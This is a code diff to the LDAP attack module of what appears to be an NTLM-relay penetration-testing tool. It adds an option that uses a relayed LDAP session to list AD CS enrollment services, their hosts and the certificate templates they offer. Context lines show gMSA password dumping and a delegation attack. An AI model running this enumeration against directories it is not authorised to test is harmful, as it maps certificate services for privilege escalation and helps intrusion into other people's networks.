@@ -704,6 +704,23 @@ class LDAPAttack(ProtocolAttack):
                     LOG.info("Successfully dumped %d gMSA passwords through relayed account %s" % (count, self.username))
                     fd.close()
 
+        if self.config.dumpadcs:
+            LOG.info("Attempting to dump ADCS enrollment services info")
+            try:
+                configuration_naming_context = next((c for c in self.client.server.info.naming_contexts if "Configuration" in c))
+            except StopIteration:
+                LOG.error("Error obtaining configuration naming context, skipping ADCS dump")
+            else:
+                adcs_attributes = ["certificateTemplates", "displayName", "dNSHostName", "msPKI-Enrollment-Servers"]
+                self.client.search("CN=Enrollment Services,CN=Public Key Services,CN=Services," + configuration_naming_context,
+                                   "(objectClass=pKIEnrollmentService)", search_scope=ldap3.LEVEL, attributes=adcs_attributes)
+
+                for entry in self.client.response:
+                    LOG.info("Found ADCS enrollment service `%s` on host `%s`, offering templates: `%s`" % (entry["attributes"]["displayName"],
+                             entry["attributes"]["dNSHostName"], "`, `".join(entry["attributes"]["certificateTemplates"])))
+                if not len(self.client.response):
+                    LOG.info("No ADCS enrollment services found")
+
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
             self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
